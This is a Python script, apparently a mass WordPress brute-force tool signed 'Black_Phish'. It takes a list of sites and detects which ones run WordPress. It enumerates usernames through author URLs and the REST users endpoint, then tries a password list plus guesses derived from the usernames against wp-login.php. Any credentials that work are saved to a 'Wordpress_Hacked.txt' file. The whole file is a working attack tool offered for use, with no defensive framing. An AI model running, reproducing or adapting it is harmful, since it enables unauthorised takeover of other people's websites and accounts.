import os,re,json
try:
	import requests
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
	exit()
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.pool import ThreadPool
	xxx = False
os.system(['clear', 'cls'][(os.name == 'nt')])
def SpeedX(check,list,th):
	if xxx == True:
		try:
			with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
				executor.map(check,list)
		except Exception as e:
			pass
	else:
		pool = ThreadPool(int(th))
		pool.map(check,list)
		pool.close()
		pool.join()
try:
	passw = open("passwords.txt","r").read().splitlines()
except:
	print(" passwords.txt file not exists")
	exit()
red = '\x1b[31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def rez(url,exploit,n):
	if "|" in exploit:
		arr = exploit.split("|")
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+r+" [NO]")
	else:
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+exploit+": "+w+url+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+exploit+": "+w+url+r+" [NO]")
def Ret(x):
	try:
		return raw_input(x)
	except:
		return input(x)
logo = """   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              """
def save(site,file):
	try:
		with open(file,'a') as write:
			write.write(site+'\n')
	except:
		pass
def WpBrute(site):
	sess = requests.session()
	users = []
	for i in range(10):
		try:
			try:
				s = sess.get('http://'+site+'/?author={}'.format(str(i + 1)),headers=headers,timeout=10,verify=False)
			except:
				try:
					s = sess.get('http://'+site+'/?author={}'.format(str(i + 1)),headers=headers,timeout=10,verify=False)
				except Exception as e:
					pass
			find = re.findall('/author/(.*)/',s.url)
			usernames = find[0]
			if '/feed' in str(usernames):
				find = re.findall('/author/(.*)/feed/',s.url)
				username2 = find[0]
				users.append(str(username2))
			else:
				users.append(str(usernames))
		except Exception as e:
			pass
	if not len(users) == 0:
		pass
	else:
		for i in range(10):
			try:
				try:
					s2 = sess.get('http://'+site+ '/index.php/wp-json/wp/v2/users/'+str(i + 1),headers=headers,timeout=10,verify=False)
				except:
					try:
						s2 = sess.get('http://'+site+ '/index.php/wp-json/wp/v2/users/'+str(i + 1),headers=headers,timeout=10,verify=False)
					except:
						pass
				jn = json.loads(s2.content.decode("utf-8"))
				if 'id' not in str(jn):
					pass
				else:
					try:
						users.append(str(jn['slug']))
					except:
						pass
			except:
				pass
	if not len(users) == 0:
		pass
	else:
		users.append('admin')
	passwm = passw+['wp@admin','wpadmin','wp_admin','wordpress','word@press']
	for u in users:
		passwm.append(str(u)+"123")
		passwm.append(str(u)+"12")
		passwm.append(str(u)+"1")
		passwm.append(str(u))
	for username in users:
		for passwd in passwm:
			try:
				try:
					r = sess.get('http://'+site+ '/wp-login.php',headers=headers,timeout=10,verify=False)
				except:
					r = sess.get('http://'+site+ '/wp-login.php',headers=headers,timeout=10,verify=False)
				try:
					svalue = re.findall('class="button button-primary button-large" value="(.*)"',r.content.decode("utf-8"))[0]
				except:
					svalue = "Log In"
				try:
					rvalue = "./wp-admin"
				except:
					rvalue = "./wp-admin"
				if 'Log In' in svalue:
					svalue = 'Log+In'
				else:
					svalue = 'Log+In'
				Headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate','Referer': ('http://{}').format(site),'Content-Type': 'application/x-www-form-urlencoded','Origin': ('http://{}').format(site),'Connection': 'keep-alive','Upgrade-Insecure-Requests': '1','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1'}
				post = {'log': username,'pwd': passwd,'wp-submit': svalue,'redirect_to': rvalue,'testcookie': '1'}
				url = site + '/wp-login.php'
				try:
					login = sess.post('http://'+url,data=post,headers=Headers,timeout=10,verify=False)
				except:
					login = sess.post('http://'+url,data=post,headers=Headers,timeout=10,verify=False)
				chkk = login.content.decode("utf-8")
				if ('/wp-admin/profile.php' in login.content.decode("utf-8") or "<li id='wp-admin-bar" in login.content.decode("utf-8") or 'wp-settings-time' in str(sess.cookie)) and "type='password'" not in (chkk.lower()).replace('"',"'"):
					rez(site," Wordpress "+"| "+username+" | "+passwd,"1")
					with open('Wordpress_Hacked.txt', 'a') as writer:
						writer.write('http://'+site+ '/wp-login.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
					return 0
				else:
					rez(site," Wordpress "+"| "+username+" | "+passwd,"b1")
			except Exception as e:
				pass
def Run(site):
	target = ['/','/wp-includes/js/jquery/jquery.js','/wp-login.php']
	for dir in target:
		try:
			try:
				r = requests.get('http://'+site+dir,headers=headers,timeout=10,verify=False).content.decode("utf-8")
			except:
				r = requests.get('http://'+site+dir,headers=headers,timeout=10,verify=False).content.decode("utf-8")
			if 'name="wp-submit"' in r:
				save(site,'Wordpress.txt')
				rez(site,'Wordpress','1')
				WpBrute(site)
				break
			elif '/wp-content/' in r or '/wp-inclues/' in r:
				save(site,'Wordpress.txt')
				rez(site,'Wordpress','1')
				WpBrute(site)
				break
			elif '(c) jQuery Foundation' in r:
				save(site,'Wordpress.txt')
				rez(site,'Wordpress','1')
				WpBrute(site)
				break
		except Exception as e:
			pass
try:
	print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Name: {}Wordpress BruteForce\n""".format(y,c,y,c))
	dorks = Ret(g+" EnterList"+w+":"+c+"~"+m+"# "+r)
	th = Ret(g+" Threads"+w+":"+c+"~"+m+"# "+r)
	dork = open(dorks,"r").read().splitlines()
	os.system(['clear', 'cls'][(os.name == 'nt')])
	SpeedX(Run,dork,th)
except:
	os.system(['clear', 'cls'][(os.name == 'nt')])
	print(" [+] Please Give Valid Input!")
	exit()